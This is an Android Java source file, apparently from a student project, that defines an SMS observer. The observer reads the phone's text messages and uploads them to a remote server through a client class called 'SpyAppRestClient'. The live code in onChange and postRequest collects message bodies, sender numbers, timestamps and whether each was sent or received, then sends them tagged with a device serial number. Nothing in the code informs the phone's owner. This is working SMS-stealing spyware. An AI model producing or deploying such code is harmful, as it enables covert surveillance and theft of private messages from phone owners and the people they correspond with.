package com.example.natalia.super_inzynierka;

import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.util.Log;
import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;
import com.loopj.android.http.AsyncHttpResponseHandler;
import com.loopj.android.http.LogHandler;
import com.loopj.android.http.RequestParams;
import cz.msebera.android.httpclient.Header;

import java.lang.reflect.Type;
import java.util.*;

/**
 * Created by Natalia on 11.01.2017.
 */
public class MyObserver extends ContentObserver {
    public static String serialNr = StartService.serialNr;
    String lastSMS = "";
    long lastDate = 0;
    String smsText;
    String smsNumber;
    Cursor cursor;
    int post = 0;
    boolean getAndUpdate;

    private ArrayList<String> listMessageDetailsTemp;
    private ArrayList<String> listNumber;
    private ArrayList<String> listDate;
    private ArrayList<String> listPosition;

    private String response_message = "";
    private String url = "list_message/";

    public MyObserver(Handler handler) {
        super(handler);
//        Log.i(" INFO: ", "2");
        serialNr = StartService.serialNr;
        listMessageDetailsTemp = new ArrayList<>();
        listNumber = new ArrayList<>();
        listDate = new ArrayList<>();
        listPosition = new ArrayList<>();
        getAndUpdate = false;
        getRequest(url);
        Timer timer = new Timer();
        timer.schedule(new TimerTask() {
            @Override
            public void run() {
                getAndUpdate();
            }
        }, 3 * 1000);
    }

    private static final Uri uri = Uri.parse("content://sms");
    private static final String COLUMN_TYPE = "type";
    private static final int MESSAGE_TYPE_SENT = 2;

    int path;

    @Override
    public void onChange(boolean selfChange) {
//        getAndUpdate();
//        System.out.println("DO GET AND UPDATE");
//        getAndUpdate();
//        System.out.println("SERIAL NR: " + serialNr);
        cursor = null;
        String state;

        try {
            cursor = StartService.contentResolver.query(uri, null, null, null, null);

//            if (cursor != null && cursor.moveToFirst()) {
//                int type = cursor.getInt(cursor.getColumnIndex(COLUMN_TYPE));

//                if (type == MESSAGE_TYPE_SENT) {
            // Sent message
//                    System.out.println("SENT MESSAGE");
//                    cursor.moveToFirst();
//                    smsText = cursor.getString(cursor.getColumnIndex("body"));
//                    System.out.println(smsText);
//                    smsNumber = cursor.getString(cursor.getColumnIndex("address"));
//                    System.out.println(smsNumber);
//                    String smsDate = cursor.getString(cursor.getColumnIndex("listDate"));
//                    System.out.println(smsDate);

//                    long listDate = Long.parseLong(smsDate);
//                    Calendar calendar = Calendar.getInstance();
//                    calendar.setTimeInMillis(listDate);
//
//                    String min;
//                    String month;
//                    String day;
//                    int mYear = calendar.get(Calendar.YEAR);
//                    int mMonth = calendar.get(Calendar.MONTH);
//                    int mDay = calendar.get(Calendar.DAY_OF_MONTH);
//                    int hour = calendar.get(Calendar.HOUR_OF_DAY);
//                    int minute = calendar.get(Calendar.MINUTE);
//                    mMonth = mMonth + 1;
//
//                    min = Integer.toString(minute);
//                    if (minute < 10) min = "0" + minute;
//                    month = Integer.toString(mMonth);
//                    if (mMonth < 10) month = "0" + mMonth;
//                    day = Integer.toString(mDay);
//                    if (mDay < 10) day = "0" + mDay;
//                    String time = displayTime(smsDate);
//
//                cursor.moveToLast();
//                System.out.println(cursor.getString(cursor.getColumnIndex("body")));
//                System.out.println(cursor.getPosition());
//                cursor.moveToFirst();
//                System.out.println(cursor.getPosition());
//
//
//
//                post = 0;
//                if(smsChecker( "Number " + smsNumber + ": " + smsText, smsDate)) {
//                    //save data into database/sd card here
////                    postRequest(smsNumber, time, smsText, serialNr);
//
//                }
//                }
//                if (type==1){
//                    System.out.println("RECEIVE");
//                    cursor.moveToNext();
//                }
//            }
            if (cursor != null) {
                if (getAndUpdate) {
                    path = 1;
                    Log.i("LOG ", "DROGA NR 1");

                    boolean is;
                    cursor.moveToLast();
                    int lastPosition = cursor.getPosition();
                    if(lastPosition>100) lastPosition = 100;
                    for (int x = 0; x <= lastPosition; x++) {
                        cursor.moveToPosition(x);
                        is = false;
                        for (int i = 0; i < listPosition.size(); i++) {
                            if (cursor.getString(cursor.getColumnIndex("_id")).equals(listPosition.get(i))) {
                                is = true;
                            }
                        }
                        if (!is) {
                            String temp1 = cursor.getString(cursor.getColumnIndex("body"));
                            String temp2 = cursor.getString(cursor.getColumnIndex("address"));
                            String temp3 = displayTime(cursor.getString(cursor.getColumnIndex("date")));
                            String position = cursor.getString(cursor.getColumnIndex("_id"));
                            state = cursor.getString(cursor.getColumnIndex("type"));
                            if (smsChecker("Number " + temp2 + ": " + temp1, cursor.getString(cursor.getColumnIndex("date")), path)) {
                                listMessageDetailsTemp.add(listMessageDetailsTemp.size(), temp1);
                                listNumber.add(listNumber.size(), temp2);
                                listDate.add(listDate.size(), temp3);
                                listPosition.add(listPosition.size(), position);
                                Log.i("LOG: ", "add cursor nr: " + position + " to database");
                                postRequest(temp2, temp3, temp1, serialNr, position, state);
                            }
                        }
                    }

                } else if (cursor.moveToFirst()) {
                    Log.i("LOG", "DROGA NR 2");

                    path = 2;
                    cursor.moveToFirst();

                    smsText = cursor.getString(cursor.getColumnIndex("body"));
                    smsNumber = cursor.getString(cursor.getColumnIndex("address"));
                    String smsDate = cursor.getString(cursor.getColumnIndex("date"));
                    state = cursor.getString(cursor.getColumnIndex("type"));

                    post = 0;
                    if (smsChecker("Number " + smsNumber + ": " + smsText, smsDate, path)) {
//                    //save data into database/sd card here
                        listMessageDetailsTemp.add(listMessageDetailsTemp.size(), smsText);
                        listNumber.add(listNumber.size(), smsNumber);
                        listDate.add(listDate.size(), displayTime(smsDate));
                        listPosition.add(listPosition.size(), cursor.getString(cursor.getColumnIndex("_id")));
                        Log.i("LOG: ", "add cursor nr: " + cursor.getString(cursor.getColumnIndex("_id")) + " to database");
                        postRequest(smsNumber, displayTime(smsDate), smsText, serialNr, cursor.getString(cursor.getColumnIndex("_id")), state);

                    }
                }
//                System.out.println("move to last " + cursor.getPosition());
//                for (x = cursor.getPosition(); x >= 0; x--) {
//                    cursor.moveToPosition(x);
//                    String temp1 = cursor.getString(cursor.getColumnIndex("body"));
//                    String temp2 = cursor.getString(cursor.getColumnIndex("address"));
//                    String temp3 = displayTime(cursor.getString(cursor.getColumnIndex("date")));
////                    System.out.println(temp);
////                    System.out.println("LISTa " + listMessageDetailsTemp.get(listNumber.size()-1) + listNumber.get(listNumber.size()-1) + listDate.get(listNumber.size()-1));
////                    if (temp1.contains(listMessageDetailsTemp.get(listNumber.size()-1)) && temp2.contains( listNumber.get(listNumber.size()-1)) && temp3.contains(listDate.get(listNumber.size()-1))/*temp.equals(listMessageDetailsTemp.get(listNumber.size()-1) + listNumber.get(listNumber.size()-1) + listDate.get(listNumber.size()-1))*/) {
//////                        System.out.println(temp);
////                        System.out.println("ROWNE");
////                        startPosition = x;
////                    }
////                    if (cursor.getPosition() < startPosition) {
//                        postRequest(cursor.getString(cursor.getColumnIndex("address")), displayTime(cursor.getString(cursor.getColumnIndex("date"))), cursor.getString(cursor.getColumnIndex("body")), serialNr, Integer.toString(x));
////                        listMessageDetailsTemp.add(listMessageDetailsTemp.size(), cursor.getString(cursor.getColumnIndex("body")));
////                        listNumber.add(listNumber.size(), cursor.getString(cursor.getColumnIndex("address")));
////                        listDate.add(listDate.size(), displayTime(cursor.getString(cursor.getColumnIndex("listDate"))));
////                    }
//                }
//                System.out.println("LISTa " + listMessageDetailsTemp.get(listNumber.size()-1) + listNumber.get(listNumber.size()-1) + listDate.get(listNumber.size()-1));
//                System.out.println(temp);
//                getRequest(url);
            }
        } finally {
            if (cursor != null)
                cursor.close();
        }
    }

    public boolean smsChecker(String sms, String date, int path) {
        Long dateLong = Long.parseLong(date);
        boolean flagSMS = true;
//        Log.i(" INFO: ", sms + dateLong);
//        Log.i(" INFO: ", lastSMS + lastDate);

        if(path==2) {
            if (sms.equals(lastSMS) || dateLong < lastDate) {
                Log.i(" INFO: ", "path 2 zostalo juz wyslane ");
                flagSMS = false;
            } else {
                Log.i(" INFO: ", "path 2 wysylamy");
                lastSMS = sms;
                lastDate = dateLong;
            }
        }

        if(path==1){
            if (sms.equals(lastSMS)) {
                Log.i(" INFO: ", "path 1 zostalo juz wyslane");
                flagSMS = false;
            } else {
                Log.i(" INFO: ", "path 1 wysylamy");
                lastSMS = sms;
                lastDate = dateLong;
            }
        }
        return flagSMS;
    }

    public void getAndUpdate() {
//        getRequest(url);
        int clickCounter = 0;

        Gson gson = new Gson();
        if (!response_message.equals("")) {
            Type type2 = new TypeToken<List<Messages>>() {
            }.getType();
            List<Messages> messagesList = gson.fromJson(response_message, type2);
            for (Messages messages : messagesList) {
                if (messages.log.equals(serialNr)) {
                    listMessageDetailsTemp.add(clickCounter, messages.text);
                    listNumber.add(clickCounter, messages.number);
                    listDate.add(clickCounter, messages.start_time);
                    listPosition.add(clickCounter, messages.position);
                    clickCounter = clickCounter + 1;
                }
            }
        }
        getAndUpdate = true;
    }

    public void postRequest(final String number, final String date, final String text, final String serialNumber, final String position, final String state) {

        post = 1;
        RequestParams params = new RequestParams();
        params.put("number", number);
        params.put("start_time", date);
        params.put("text", text);
        params.put("log", serialNumber);
        params.put("position", position);
        params.put("state", state);
        SpyAppRestClient.post("create_message/", params, new AsyncHttpResponseHandler() {
            @Override
            public void onSuccess(int statusCode, Header[] headers, byte[] responseBody) {
                Log.i(" INFO: ", "ON SUCCESS SMS");
            }

            @Override
            public void onFailure(int statusCode, Header[] headers, byte[] responseBody, Throwable error) {
                Log.i(" INFO: ", "ON FAILURE SMS");
            }
        });
    }

    private void getRequest(String url) {
        SpyAppRestClient.get(url, null, new AsyncHttpResponseHandler() {
            @Override
            public void onSuccess(int statusCode, Header[] headers, byte[] responseBody) {
                if (responseBody == null) { /* empty response, alert something*/
                    return;
                }
                response_message = new String(responseBody);
            }

            @Override
            public void onFailure(int statusCode, Header[] headers, byte[] responseBody, Throwable error) {
                if (responseBody == null) { /* empty response, alert something*/
                    return;
                }
                response_message = new String(responseBody);

            }
        });
    }

    public String displayTime(String smsDate) {
        long date = Long.parseLong(smsDate);
        Calendar calendar = Calendar.getInstance();
        calendar.setTimeInMillis(date);

        String min;
        String month;
        String day;
        int mYear = calendar.get(Calendar.YEAR);
        int mMonth = calendar.get(Calendar.MONTH);
        int mDay = calendar.get(Calendar.DAY_OF_MONTH);
        int hour = calendar.get(Calendar.HOUR_OF_DAY);
        int minute = calendar.get(Calendar.MINUTE);
        mMonth = mMonth + 1;

        min = Integer.toString(minute);
        if (minute < 10) min = "0" + minute;
        month = Integer.toString(mMonth);
        if (mMonth < 10) month = "0" + mMonth;
        day = Integer.toString(mDay);
        if (mDay < 10) day = "0" + mDay;
        return day + "-" + month + "-" + mYear + "  " + hour + ":" + min;
    }
}
